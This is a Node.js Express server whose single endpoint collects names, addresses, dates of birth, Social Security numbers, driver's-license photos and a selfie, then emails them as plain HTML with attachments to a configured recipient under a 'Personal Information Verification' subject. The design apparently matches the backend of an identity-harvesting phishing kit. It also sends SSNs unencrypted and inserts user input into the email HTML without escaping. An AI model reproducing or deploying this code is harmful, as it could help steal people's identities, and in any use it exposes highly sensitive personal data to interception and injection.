import express from "express";
import cors from "cors";
import multer from "multer";
import { Resend } from "resend";
import dotenv from "dotenv";
import path from "path";
import { fileURLToPath } from "url";

dotenv.config();
const app = express();
const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY);

// Middleware
app.use(
  cors({
    origin: process.env.FRONTEND_URL || "http://localhost:3000",
    credentials: true,
  })
);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from public folder
app.use(express.static(path.join(__dirname, "public")));

// Configure multer for file uploads
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB max
  fileFilter: (req, file, cb) => {
    // Only accept image files
    if (file.mimetype.startsWith("image/")) {
      cb(null, true);
    } else {
      cb(new Error("Only image files are allowed"));
    }
  },
});

// Health check endpoint
app.get("/health", (req, res) => {
  res.json({ status: "Server is running" });
});

// Submit form endpoint
app.post(
  "/api/submit",
  upload.fields([
    { name: "driversLicenseFront", maxCount: 1 },
    { name: "driversLicenseBack", maxCount: 1 },
    { name: "selfie", maxCount: 1 },
  ]),
  async (req, res) => {
    try {
      const { fullName, lastName, phoneNumber, address, gender, dateOfBirth, ssn } =
        req.body;
      const files = req.files || {};

      // Validate required fields
      if (!fullName || !lastName || !phoneNumber || !address || !gender || !dateOfBirth || !ssn) {
        return res.status(400).json({ error: "All fields are required" });
      }

      if (!files.driversLicenseFront || !files.driversLicenseBack || !files.selfie) {
        return res.status(400).json({ error: "All documents are required" });
      }

      // Prepare attachments for Resend
      const attachments = [
        {
          filename: `drivers_license_front${path.extname(files.driversLicenseFront[0].originalname)}`,
          content: files.driversLicenseFront[0].buffer.toString("base64"),
        },
        {
          filename: `drivers_license_back${path.extname(files.driversLicenseBack[0].originalname)}`,
          content: files.driversLicenseBack[0].buffer.toString("base64"),
        },
        {
          filename: `selfie${path.extname(files.selfie[0].originalname)}`,
          content: files.selfie[0].buffer.toString("base64"),
        },
      ];

      // Prepare email HTML
      const emailHTML = `
        <h2>New Form Submission</h2>
        <p><strong>Full Name:</strong> ${fullName}</p>
        <p><strong>Last Name:</strong> ${lastName}</p>
        <p><strong>Phone Number:</strong> ${phoneNumber}</p>
        <p><strong>Address:</strong> ${address}</p>
        <p><strong>Gender:</strong> ${gender}</p>
        <p><strong>Date of Birth:</strong> ${dateOfBirth}</p>
        <p><strong>SSN:</strong> ${ssn}</p>
        <p>Documents are attached.</p>
      `;

      // Send email via Resend
      const response = await resend.emails.send({
        from: process.env.SENDER_EMAIL || "onboarding@resend.dev",
        to: process.env.RECIPIENT_EMAIL || "delivered@resend.dev",
        subject: "New Form Submission - Personal Information Verification",
        html: emailHTML,
        attachments: attachments.map((att) => ({
          filename: att.filename,
          content: Buffer.from(att.content, "base64"),
        })),
      });

      console.log("Email sent successfully:", response);

      return res.status(200).json({
        success: true,
        message: "Form submitted successfully",
        emailId: response.id,
      });
    } catch (error) {
      console.error("Error processing form:", error);
      return res.status(500).json({
        error: error.message || "Failed to process form submission",
      });
    }
  }
);

// Fallback route - serve index.html for frontend routing
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: err.message || "Internal server error" });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✓ Server running on port ${PORT}`);
  console.log(`✓ CORS enabled for: ${process.env.FRONTEND_URL || "http://localhost:3000"}`);
});